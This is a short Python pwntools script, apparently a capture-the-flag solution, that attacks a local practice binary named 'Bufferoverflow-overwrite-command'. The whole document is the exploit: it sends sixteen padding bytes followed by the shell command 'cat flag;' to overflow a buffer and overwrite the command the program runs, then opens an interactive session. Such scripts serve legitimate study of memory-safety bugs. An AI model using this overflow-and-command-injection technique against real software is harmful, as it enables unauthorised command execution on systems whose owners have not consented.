from pwn import*

p = process('./Bufferoverflow-overwrite-command')

payload = b'a'*16 + b"cat flag;"

p.sendline(payload)
p.interactive()
